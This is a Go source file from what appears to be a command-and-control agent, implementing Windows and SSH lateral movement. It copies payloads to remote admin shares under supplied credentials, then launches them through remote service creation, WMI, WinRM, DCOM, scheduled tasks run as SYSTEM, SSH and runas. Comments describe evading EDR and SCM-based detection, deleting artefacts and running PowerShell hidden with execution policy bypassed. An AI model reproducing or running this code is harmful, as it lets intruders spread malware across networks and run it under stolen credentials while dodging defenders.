//go:build windows

package agent

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows"
)

// ── SCM procs ─────────────────────────────────────────────────────────────────

var (
	modAdvapi32lat          = syscall.NewLazyDLL("advapi32.dll")
	procOpenSCManagerW      = modAdvapi32lat.NewProc("OpenSCManagerW")
	procCreateServiceW      = modAdvapi32lat.NewProc("CreateServiceW")
	procStartServiceW       = modAdvapi32lat.NewProc("StartServiceW")
	procDeleteServiceLat    = modAdvapi32lat.NewProc("DeleteService")
	procCloseServiceHandleLat = modAdvapi32lat.NewProc("CloseServiceHandle")
	procControlServiceLat   = modAdvapi32lat.NewProc("ControlService")
	procCreateProcessWithLogonWLat = modAdvapi32lat.NewProc("CreateProcessWithLogonW")
)

const (
	scManagerConnect       = 0x0001
	scManagerCreateService = 0x0002
	serviceWin32OwnProcess = 0x00000010
	serviceDemandStart     = 0x00000003
	serviceErrorIgnore     = 0x00000000
	serviceAllAccess       = 0x000F01FF
	serviceControlStop     = 0x00000001
)

type svcStatus struct{ dwServiceType, dwCurrentState, dwControlsAccepted, dwWin32ExitCode, dwServiceSpecificExitCode, dwCheckPoint, dwWaitHint uint32 }

// ── helpers ───────────────────────────────────────────���───────────────────────

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// randSvcName returns a short random service name like "svc3f8a1b2c".
func randSvcName() string {
	n := time.Now().UnixNano()
	return fmt.Sprintf("svc%08x", uint32(n^(n>>32)))
}

// splitDomainUser splits "DOMAIN\user" or "user@domain" → (domain, user).
func splitDomainUser(u string) (string, string) {
	if i := strings.IndexByte(u, '\\'); i >= 0 {
		return u[:i], u[i+1:]
	}
	if i := strings.IndexByte(u, '@'); i >= 0 {
		return u[i+1:], u[:i]
	}
	return ".", u
}

// smbWriteAs writes data to a UNC path using explicit credentials via
// LogonUser(LOGON32_LOGON_NEW_CREDENTIALS=9) + ImpersonateLoggedOnUser.
// This works from any security context including SYSTEM/service where
// WNetAddConnection2W fails with ERROR_NO_SUCH_LOGON_SESSION (1312).
// Uses procLogonUserW / procImpersonateLoggedOnUser from commands_windows.go.
func smbWriteAs(uncPath string, data []byte, user, pass string) error {
	// Pin this goroutine to the current OS thread so that ImpersonateLoggedOnUser
	// (which sets a per-thread token) applies to the os.WriteFile syscall below.
	// Without this, Go's runtime may migrate the goroutine to a different thread
	// mid-function and the impersonation token would not carry over.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	dom, usr := splitDomainUser(user)
	usrPtr, _ := windows.UTF16PtrFromString(usr)
	domPtr, _ := windows.UTF16PtrFromString(dom)
	passPtr, _ := windows.UTF16PtrFromString(pass)

	// Type 9 = LOGON32_LOGON_NEW_CREDENTIALS: keeps local identity but uses
	// provided credentials for all outbound network authentication.
	var tok windows.Token
	r, _, e := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usrPtr)),
		uintptr(unsafe.Pointer(domPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		9, // LOGON32_LOGON_NEW_CREDENTIALS
		0, // LOGON32_PROVIDER_DEFAULT
		uintptr(unsafe.Pointer(&tok)),
	)
	if r == 0 {
		return fmt.Errorf("logon(%s\\%s): %w", dom, usr, e)
	}
	defer windows.CloseHandle(windows.Handle(tok))

	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(tok))
	if r == 0 {
		return fmt.Errorf("impersonate: %w", e)
	}
	defer procRevertToSelf2.Call()

	return os.WriteFile(uncPath, data, 0644)
}

// isLocalHost returns true when host resolves to one of the machine's own IPs.
// Loopback SMB (\\<own IP>\C$) silently fails on Windows even with admin creds,
// so callers must stage files directly instead of over the network share.
func isLocalHost(host string) bool {
	addrs, err := net.LookupHost(host)
	if err != nil {
		return host == "127.0.0.1" || strings.EqualFold(host, "localhost")
	}
	ifaces, _ := net.Interfaces()
	local := make(map[string]bool)
	for _, iface := range ifaces {
		ifAddrs, _ := iface.Addrs()
		for _, a := range ifAddrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				local[ipnet.IP.String()] = true
			}
		}
	}
	local["127.0.0.1"] = true
	local["::1"] = true
	for _, a := range addrs {
		if local[a] {
			return true
		}
	}
	return false
}

// smbStage stages data to \\host\ADMIN$\<name> or \\host\C$\Windows\Temp\<name>.
// It first tries the existing session (fastest, works when the caller already
// has access), then falls back to explicit-credential impersonation when
// user/pass are provided. Works in service and SYSTEM contexts.
// For local targets, writes directly to avoid the Windows loopback SMB restriction.
func smbStage(host, name, user, pass string, data []byte) (string, error) {
	// Windows blocks loopback SMB writes to admin shares (even with admin creds)
	// without returning a useful error. Write directly when targeting localhost.
	if isLocalHost(host) {
		local1 := `C:\Windows\` + name
		if err := os.WriteFile(local1, data, 0644); err == nil {
			return local1, nil
		}
		local2 := `C:\Windows\Temp\` + name
		if err := os.WriteFile(local2, data, 0644); err == nil {
			return local2, nil
		}
		return "", fmt.Errorf("stage to %s (local): failed to write to Windows or Temp", host)
	}

	unc1 := `\\` + host + `\ADMIN$\` + name
	unc2 := `\\` + host + `\C$\Windows\Temp\` + name

	// Try with current credentials first.
	if err := os.WriteFile(unc1, data, 0644); err == nil {
		return `C:\Windows\` + name, nil
	}
	if err := os.WriteFile(unc2, data, 0644); err == nil {
		return `C:\Windows\Temp\` + name, nil
	}

	// Fall back to impersonation with explicit credentials.
	if user != "" && pass != "" {
		if err := smbWriteAs(unc1, data, user, pass); err == nil {
			return `C:\Windows\` + name, nil
		}
		if err := smbWriteAs(unc2, data, user, pass); err == nil {
			return `C:\Windows\Temp\` + name, nil
		}
	}

	return "", fmt.Errorf("stage to %s: ADMIN$ and C$\\Windows\\Temp both failed (check share access)", host)
}

// ── psExec ────────────────────────────────────���───────────────────────────────

// lateralPSExec stages data to the remote host via SMB admin$ and executes it
// by creating a one-shot service via the remote Service Control Manager.
// The SCM entry is deleted immediately after the service starts to reduce
// footprint (the process continues running).
func lateralPSExec(host string, data []byte, svcName, user, pass string) (string, error) {
	if isLocalHost(host) {
		return "", fmt.Errorf("psexec does not support local targets (Windows blocks SCM auth to self) — use dcom instead")
	}
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	localPath, err := smbStage(host, exeName, user, pass, data)
	if err != nil {
		return "", fmt.Errorf("psexec: %w", err)
	}

	machineW, _ := windows.UTF16PtrFromString(`\\` + host)
	scm, _, e := procOpenSCManagerW.Call(
		uintptr(unsafe.Pointer(machineW)),
		0,
		scManagerConnect|scManagerCreateService,
	)
	if scm == 0 {
		return "", fmt.Errorf("psexec OpenSCManager %s: %w", host, e)
	}
	defer procCloseServiceHandleLat.Call(scm)

	svcNameW, _ := windows.UTF16PtrFromString(svcName)
	exePathW, _ := windows.UTF16PtrFromString(localPath)

	svc, _, e := procCreateServiceW.Call(
		scm,
		uintptr(unsafe.Pointer(svcNameW)),
		uintptr(unsafe.Pointer(svcNameW)), // display name = service name
		serviceAllAccess,
		serviceWin32OwnProcess,
		serviceDemandStart,
		serviceErrorIgnore,
		uintptr(unsafe.Pointer(exePathW)),
		0, 0, 0, 0, 0,
	)
	if svc == 0 {
		return "", fmt.Errorf("psexec CreateService %s: %w", host, e)
	}
	defer procCloseServiceHandleLat.Call(svc)

	r, _, e := procStartServiceW.Call(svc, 0, 0)
	procDeleteServiceLat.Call(svc) // clean up SCM entry; process continues running
	if r == 0 {
		// 1053 = ERROR_SERVICE_REQUEST_TIMEOUT — binary started but never called
		// SetServiceStatus(SERVICE_RUNNING). The process is alive; treat as success.
		if errno, ok := e.(syscall.Errno); !ok || errno != 1053 {
			return "", fmt.Errorf("psexec StartService %s: %w", host, e)
		}
	}

	return fmt.Sprintf("[+] psexec → %s\n    svc : %s\n    path: %s", host, svcName, localPath), nil
}

// ── wmiExec ───────��─────────────────────��─────────────────────────────────────

// lateralWMI stages data via SMB and spawns it using WMI Win32_Process::Create.
// Credentials are passed directly to wmic /user /password.
func lateralWMI(host string, data []byte, svcName, user, pass string) (string, error) {
	if isLocalHost(host) {
		return "", fmt.Errorf("wmi does not support local targets (WBEM_E_LOCAL_CREDENTIALS) — use dcom instead")
	}
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	localPath, err := smbStage(host, exeName, user, pass, data)
	if err != nil {
		return "", fmt.Errorf("wmi: %w", err)
	}

	var cmd string
	if user != "" && pass != "" {
		dom, usr := splitDomainUser(user)
		cmd = fmt.Sprintf(`wmic /node:"%s" /user:"%s\\%s" /password:"%s" process call create "%s"`,
			host, dom, usr, pass, localPath)
	} else {
		cmd = fmt.Sprintf(`wmic /node:"%s" process call create "%s"`, host, localPath)
	}

	out, err := runShell(cmd)
	if err != nil {
		return out, fmt.Errorf("wmi %s: %s: %w", host, strings.TrimSpace(out), err)
	}
	return fmt.Sprintf("[+] wmi → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
}

// ─�� winrmExec (lateral variant) ───────────────────────────────────────────────

// lateralWinRM stages data via SMB and triggers execution via WinRM
// using PowerShell Invoke-Command.
func lateralWinRM(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	localPath, err := smbStage(host, exeName, user, pass, data)
	if err != nil {
		return "", fmt.Errorf("winrm: %w", err)
	}

	// reuse winrmDeploy (winrm_windows.go) to launch the staged EXE
	psPayload := fmt.Sprintf("Start-Process '%s' -WindowStyle Hidden", escapePS(localPath))
	out, err := winrmDeploy(host, user, pass, psPayload)
	if err != nil {
		return out, fmt.Errorf("winrm %s: %w", host, err)
	}
	return fmt.Sprintf("[+] winrm → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
}

// ── SSH lateral ───────────────────────────────────────────────────────────────

// lateralSSH stages the payload via SCP and executes it over SSH.
// Uses golang.org/x/crypto/ssh for pure-Go SSH without external binaries.
func lateralSSH(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	// ── connect ───────────────────────────────────────────────────────────────
	addr := host
	if !strings.Contains(host, ":") {
		addr = host + ":22"
	}
	cfg := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil // accept any host key (red team context)
		},
		Timeout: 10 * time.Second,
	}
	client, err := ssh.Dial("tcp", addr, cfg)
	if err != nil {
		return "", fmt.Errorf("ssh lateral dial %s: %w", addr, err)
	}
	defer client.Close()

	// ── stage via SCP (inline, no scp binary required) ───────────────────────
	remotePath := `/tmp/` + exeName
	if err := scpUpload(client, data, remotePath); err != nil {
		return "", fmt.Errorf("ssh lateral scp: %w", err)
	}

	// ── execute ───────────────────────────────────────────────────────────────
	sess, err := client.NewSession()
	if err != nil {
		return "", fmt.Errorf("ssh lateral session: %w", err)
	}
	defer sess.Close()

	cmd := fmt.Sprintf("chmod +x %s && nohup %s </dev/null >/dev/null 2>&1 &", remotePath, remotePath)
	out, _ := sess.CombinedOutput(cmd)
	return fmt.Sprintf("[+] ssh → %s\n    path: %s\n%s", host, remotePath, strings.TrimSpace(string(out))), nil
}

// scpUpload sends data to remotePath on the SSH server using the SCP protocol.
func scpUpload(client *ssh.Client, data []byte, remotePath string) error {
	sess, err := client.NewSession()
	if err != nil {
		return err
	}
	defer sess.Close()

	w, err := sess.StdinPipe()
	if err != nil {
		return err
	}

	dir := remotePath[:strings.LastIndex(remotePath, "/")+1]
	base := remotePath[strings.LastIndex(remotePath, "/")+1:]

	errCh := make(chan error, 1)
	go func() {
		defer w.Close()
		_, e := fmt.Fprintf(w, "C0755 %d %s\n", len(data), base)
		if e != nil {
			errCh <- e
			return
		}
		_, e = w.Write(data)
		if e != nil {
			errCh <- e
			return
		}
		w.Write([]byte{0})
		errCh <- nil
	}()

	if err := sess.Run(fmt.Sprintf("scp -qt %s", dir)); err != nil {
		<-errCh
		return err
	}
	return <-errCh
}

// ── smbExec ───────────────────────────────────────────────────────────────────

// lateralSMBExec stages the payload via SMB then executes it using a temporary
// service whose binPath is cmd.exe — the service binary itself is never the
// agent binary. Execution chain: SERVICES.EXE → cmd.exe → agent.exe
// This extra indirection bypasses EDR rules that flag SERVICES.EXE directly
// spawning unknown binaries (the classic psexec signature).
func lateralSMBExec(host string, data []byte, svcName, user, pass string) (string, error) {
	if isLocalHost(host) {
		return "", fmt.Errorf("smbexec does not support local targets (Windows blocks SCM auth to self) — use dcom instead")
	}
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	localPath, err := smbStage(host, exeName, user, pass, data)
	if err != nil {
		return "", fmt.Errorf("smbexec: %w", err)
	}

	// binPath = cmd.exe as service binary; launches agent in a new process group
	// so it escapes the service Job Object (start /B keeps same job — agent dies
	// when cmd.exe exits; start "" /min creates new console+group, breaking out).
	safePath := strings.ReplaceAll(localPath, `"`, `\"`)
	binPath := fmt.Sprintf(`C:\Windows\System32\cmd.exe /Q /c start "" /min "%s"`, safePath)

	machineW, _ := windows.UTF16PtrFromString(`\\` + host)
	scm, _, e := procOpenSCManagerW.Call(
		uintptr(unsafe.Pointer(machineW)),
		0,
		scManagerConnect|scManagerCreateService,
	)
	if scm == 0 {
		return "", fmt.Errorf("smbexec OpenSCManager %s: %w", host, e)
	}
	defer procCloseServiceHandleLat.Call(scm)

	svcNameW, _ := windows.UTF16PtrFromString(svcName)
	binPathW, _ := windows.UTF16PtrFromString(binPath)

	svc, _, e := procCreateServiceW.Call(
		scm,
		uintptr(unsafe.Pointer(svcNameW)),
		uintptr(unsafe.Pointer(svcNameW)),
		serviceAllAccess,
		serviceWin32OwnProcess,
		serviceDemandStart,
		serviceErrorIgnore,
		uintptr(unsafe.Pointer(binPathW)),
		0, 0, 0, 0, 0,
	)
	if svc == 0 {
		return "", fmt.Errorf("smbexec CreateService %s: %w", host, e)
	}
	defer procCloseServiceHandleLat.Call(svc)

	r, _, e := procStartServiceW.Call(svc, 0, 0)
	procDeleteServiceLat.Call(svc)
	if r == 0 {
		if errno, ok := e.(syscall.Errno); !ok || errno != 1053 {
			return "", fmt.Errorf("smbexec StartService %s: %w", host, e)
		}
	}

	return fmt.Sprintf("[+] smbexec → %s\n    svc : %s\n    path: %s\n    chain: SERVICES.EXE→cmd.exe→agent", host, svcName, localPath), nil
}

// ── atExec ────────────────────────────────────────────────────────────────────

// lateralATExec stages the payload via SMB then runs it by creating a remote
// scheduled task via the MS-TSCH protocol (schtasks.exe). The task is created,
// triggered immediately, and deleted — no persistent artefact is left behind.
// Execution context: SYSTEM (or specified user), spawned by taskeng.exe/
// svchost.exe, completely bypassing SCM-based detection.
func lateralATExec(host string, data []byte, svcName, user, pass string) (string, error) {
	if isLocalHost(host) {
		return "", fmt.Errorf("atexec does not support local targets (Windows blocks credential auth to self) — use dcom instead")
	}
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	localPath, err := smbStage(host, exeName, user, pass, data)
	if err != nil {
		return "", fmt.Errorf("atexec: %w", err)
	}

	// schtasks helper: build command with optional remote creds
	sch := func(subCmd string) (string, error) {
		var cmd string
		if user != "" && pass != "" {
			cmd = fmt.Sprintf(`schtasks %s /S "%s" /U "%s" /P "%s"`, subCmd, host, user, pass)
		} else {
			cmd = fmt.Sprintf(`schtasks %s /S "%s"`, subCmd, host)
		}
		return runShell(cmd)
	}

	taskName := `\` + svcName
	startAt := time.Now().Add(2 * time.Minute).Format("15:04")

	// Create task: run as SYSTEM, one-time, execute immediately via /RUN
	createArgs := fmt.Sprintf(`/Create /TN "%s" /TR "%s" /SC ONCE /ST %s /RU SYSTEM /F`,
		taskName, localPath, startAt)
	if out, err := sch(createArgs); err != nil {
		return out, fmt.Errorf("atexec create task %s: %w", host, err)
	}

	// Trigger immediately
	runArgs := fmt.Sprintf(`/Run /TN "%s"`, taskName)
	out, err := sch(runArgs)
	if err != nil {
		sch(fmt.Sprintf(`/Delete /TN "%s" /F`, taskName)) //nolint:errcheck
		return out, fmt.Errorf("atexec run task %s: %w", host, err)
	}

	// Clean up — ignore error (task may self-delete after running)
	sch(fmt.Sprintf(`/Delete /TN "%s" /F`, taskName)) //nolint:errcheck

	return fmt.Sprintf("[+] atexec → %s\n    task: %s\n    path: %s\n    runas: SYSTEM", host, taskName, localPath), nil
}

// ── DCOM lateral ──────────────────────────────────────────────────────────────

// lateralDCOM stages data via SMB and executes it using DCOM MMC20.Application.
// This uses PowerShell's [activator]::CreateInstance to call ExecuteShellCommand
// on the remote MMC20.Application COM object — no direct WMI, no SCM.
func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, error) {
	if svcName == "" {
		svcName = randSvcName()
	}
	exeName := svcName + ".exe"

	localPath, err := smbStage(host, exeName, user, pass, data)
	if err != nil {
		return "", fmt.Errorf("dcom: %w", err)
	}

	// MMC20.Application via PowerShell — works without local admin on target
	// (only requires DCOM access, which Domain Admins have by default).
	// Call the EXE directly as sFile (no cmd.exe wrapper) — avoids the single-quote
	// quoting problem where cmd.exe treats 'path' as a literal filename with quote chars.
	safePath := strings.ReplaceAll(localPath, `"`, `\"`)
	psCmd := fmt.Sprintf(
		`$c=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","%s"));`+
			`$c.Document.ActiveView.ExecuteShellCommand("%s",$null,"","7")`,
		host, safePath,
	)
	cmd := fmt.Sprintf(`powershell -NoP -W Hidden -Exec Bypass -C "%s"`,
		strings.ReplaceAll(psCmd, `"`, `\"`))

	out, err := runShell(cmd)
	if err != nil {
		return out, fmt.Errorf("dcom %s: %s: %w", host, strings.TrimSpace(out), err)
	}
	return fmt.Sprintf("[+] dcom → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
}

// ── runAs ─────────────────────────────────────────────────────────────────────

// runAsDirect starts the child immediately with supplied credentials and does
// not require a scheduled task. If Secondary Logon is unavailable, fall back
// to a primary token plus CreateProcessAsUserW/CreateProcessWithTokenW.
func runAsDirect(localPath, user, pass string) (uint32, string, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	domain, username := splitDomainUser(user)
	userW, err := syscall.UTF16PtrFromString(username)
	if err != nil {
		return 0, "", fmt.Errorf("invalid username: %w", err)
	}
	domainW, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return 0, "", fmt.Errorf("invalid domain: %w", err)
	}
	passW, err := syscall.UTF16PtrFromString(pass)
	if err != nil {
		return 0, "", fmt.Errorf("invalid password: %w", err)
	}
	appW, err := syscall.UTF16PtrFromString(localPath)
	if err != nil {
		return 0, "", fmt.Errorf("invalid payload path: %w", err)
	}
	cmdW, err := syscall.UTF16PtrFromString(`"` + localPath + `"`)
	if err != nil {
		return 0, "", fmt.Errorf("invalid payload command line: %w", err)
	}
	cwdW, _ := syscall.UTF16PtrFromString(`C:\Windows\System32`)

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0
	var pi windows.ProcessInformation

	// LOGON_WITH_PROFILE is intentionally not used: the child only needs a
	// valid local logon token and loading the full user profile is unnecessary.
	r, _, e := procCreateProcessWithLogonWLat.Call(
		uintptr(unsafe.Pointer(userW)), uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)), 0,
		uintptr(unsafe.Pointer(appW)), uintptr(unsafe.Pointer(cmdW)),
		0x08000000, 0, uintptr(unsafe.Pointer(cwdW)),
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
	)
	logonErr := uint32(0)
	if r == 0 {
		logonErr = winErrno(e)
	} else {
		pid := pi.ProcessId
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
		return pid, "CreateProcessWithLogonW", nil
	}

	// Compatibility path for systems where Secondary Logon is disabled or
	// blocked. Use the stored SYSTEM token when available so the fallback has
	// the same privilege context as the post-getsystem shell.
	if gSystemToken != 0 {
		if ir, _, ie := procImpersonateLoggedOnUser.Call(uintptr(gSystemToken)); ir != 0 {
			defer procRevertToSelf2.Call()
			_ = enableTokenPrivilege(windows.Handle(gSystemToken), "SeImpersonatePrivilege")
			_ = enableTokenPrivilege(windows.Handle(gSystemToken), "SeIncreaseQuotaPrivilege")
			_ = enableTokenPrivilege(windows.Handle(gSystemToken), "SeAssignPrimaryTokenPrivilege")
		} else {
			_ = ie // retain the CreateProcessWithLogonW error for diagnostics
		}
	}
	_ = enablePrivilege("SeImpersonatePrivilege")
	_ = enablePrivilege("SeIncreaseQuotaPrivilege")
	_ = enablePrivilege("SeAssignPrimaryTokenPrivilege")

	var token windows.Token
	batchErr := uint32(0)
	interactiveErr := uint32(0)
	r, _, e = procLogonUserW.Call(
		uintptr(unsafe.Pointer(userW)), uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)), 4, 0,
		uintptr(unsafe.Pointer(&token)),
	)
	if r == 0 {
		batchErr = winErrno(e)
		r, _, e = procLogonUserW.Call(
			uintptr(unsafe.Pointer(userW)), uintptr(unsafe.Pointer(domainW)),
			uintptr(unsafe.Pointer(passW)), 2, 0,
			uintptr(unsafe.Pointer(&token)),
		)
		if r == 0 {
			interactiveErr = winErrno(e)
			return 0, "", fmt.Errorf("CreateProcessWithLogonW=%d; LogonUser batch=%d interactive=%d",
				logonErr, batchErr, interactiveErr)
		}
	}
	defer windows.CloseHandle(windows.Handle(token))

	var asUserErr, withTokenErr uint32
	usedToken := false
	cmdAsUserW, _ := syscall.UTF16PtrFromString(`"` + localPath + `"`)
	r, _, e = procCreateProcessAsUserW2.Call(
		uintptr(token), uintptr(unsafe.Pointer(appW)), uintptr(unsafe.Pointer(cmdAsUserW)),
		0, 0, 0, 0x08000000, 0, uintptr(unsafe.Pointer(cwdW)),
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		asUserErr = winErrno(e)
		usedToken = true
		cmdWithTokenW, _ := syscall.UTF16PtrFromString(`"` + localPath + `"`)
		r, _, e = procCreateProcessWithTokenW2.Call(
			uintptr(token), 0, uintptr(unsafe.Pointer(appW)), uintptr(unsafe.Pointer(cmdWithTokenW)),
			0x08000000, 0, uintptr(unsafe.Pointer(cwdW)),
			uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
		)
		if r == 0 {
			withTokenErr = winErrno(e)
			return 0, "", fmt.Errorf("CreateProcessWithLogonW=%d; AsUser=%d WithToken=%d",
				logonErr, asUserErr, withTokenErr)
		}
	}

	pid := pi.ProcessId
	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)
	if usedToken {
		return pid, "CreateProcessWithTokenW", nil
	}
	return pid, "CreateProcessAsUserW", nil
}

// lateralRunAs spawns the payload as a different local user. It does not open
// a network session to the SCM, so Windows loopback restrictions do not apply.
//
// Only works for local targets; use dcom/psexec for remote hosts.
func lateralRunAs(host string, data []byte, existingPath, svcName, user, pass string) (string, error) {
	if !isLocalHost(host) {
		return "", fmt.Errorf("runas only supports local targets — use psexec/wmi/dcom for remote hosts")
	}
	if svcName == "" {
		svcName = randSvcName()
	}

	var localPath string
	if existingPath != "" {
		// Copy to C:\Users\Public\ so the target user can read it (user's own
		// AppData\Local\Temp is not accessible to other local accounts).
		base := filepath.Base(existingPath)
		pubPath := `C:\Users\Public\` + base
		if !strings.EqualFold(existingPath, pubPath) {
			if err := copyFile(existingPath, pubPath); err != nil {
				return "", fmt.Errorf("runas: copy payload to Public: %w", err)
			}
			localPath = pubPath
		} else {
			localPath = existingPath
		}
		if _, err := os.Stat(localPath); err != nil {
			return "", fmt.Errorf("runas: staged payload is not readable: %w", err)
		}
	} else {
		// Stage payload directly (no SMB loopback issue)
		exeName := svcName + ".exe"
		pubPath := `C:\Users\Public\` + exeName
		if err := os.WriteFile(pubPath, data, 0644); err == nil {
			localPath = pubPath
		} else {
			localPath = `C:\Windows\Temp\` + exeName
			if err := os.WriteFile(localPath, data, 0644); err != nil {
				localPath = `C:\Windows\` + exeName
				if err2 := os.WriteFile(localPath, data, 0644); err2 != nil {
					return "", fmt.Errorf("runas: write payload: %w", err)
				}
			}
		}
	}

	if pid, method, err := runAsDirect(localPath, user, pass); err == nil {
		return fmt.Sprintf("[+] runas → %s @ %s\n    path: %s\n    pid: %d\n    method: %s",
			user, host, localPath, pid, method), nil
	} else {
		// Keep the diagnostic and use the legacy scheduler only as a last resort.
		// It is included in the eventual error so a rejected direct launch is not
		// mistaken for a successful process start.
		directErr := err.Error()
		taskName := svcName
		domain, username := ".", user
		if idx := strings.IndexByte(user, '\\'); idx >= 0 {
			domain, username = user[:idx], user[idx+1:]
		} else if idx := strings.IndexByte(user, '@'); idx >= 0 {
			username, domain = user[:idx], user[idx+1:]
		}
		ruAccount := username
		if domain != "." {
			ruAccount = domain + `\` + username
		}
		startAt := time.Now().Add(2 * time.Minute).Format("15:04")
		out, createErr := exec.Command("schtasks",
			"/create", "/RU", ruAccount, "/RP", pass,
			"/TR", localPath, "/TN", taskName,
			"/SC", "ONCE", "/ST", startAt, "/RL", "HIGHEST", "/F",
		).CombinedOutput()
		if createErr != nil {
			return "", fmt.Errorf("runas: direct launch failed: %s\nrunas: schtasks /create: %w\n%s",
				directErr, createErr, strings.TrimSpace(string(out)))
		}
		runOut, runErr := exec.Command("schtasks", "/run", "/TN", taskName).CombinedOutput()
		if runErr != nil {
			exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
			return "", fmt.Errorf("runas: direct launch failed: %s\nrunas: schtasks /run: %w\n%s",
				directErr, runErr, strings.TrimSpace(string(runOut)))
		}
		go func() {
			time.Sleep(4 * time.Second)
			exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
		}()
		return fmt.Sprintf("[+] runas → %s @ %s\n    path: %s\n    task: %s (deleted in 4s)\n    direct launch failed: %s",
			ruAccount, host, localPath, taskName, directErr), nil
	}
}

// ── dispatcher ────────────────────────────────────────────────────────────────

// runLateral dispatches to the chosen lateral movement method.
func runLateral(method, host string, data []byte, existingPath, svcName, user, pass string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(method)) {
	case "psexec":
		return lateralPSExec(host, data, svcName, user, pass)
	case "wmi":
		return lateralWMI(host, data, svcName, user, pass)
	case "winrm":
		return lateralWinRM(host, data, svcName, user, pass)
	case "ssh":
		return lateralSSH(host, data, svcName, user, pass)
	case "dcom":
		return lateralDCOM(host, data, svcName, user, pass)
	case "smbexec", "smb":
		return lateralSMBExec(host, data, svcName, user, pass)
	case "atexec", "at":
		return lateralATExec(host, data, svcName, user, pass)
	case "runas":
		return lateralRunAs(host, data, existingPath, svcName, user, pass)
	default:
		return "", fmt.Errorf("unknown method %q — use psexec|wmi|winrm|ssh|dcom|smbexec|atexec|runas", method)
	}
}
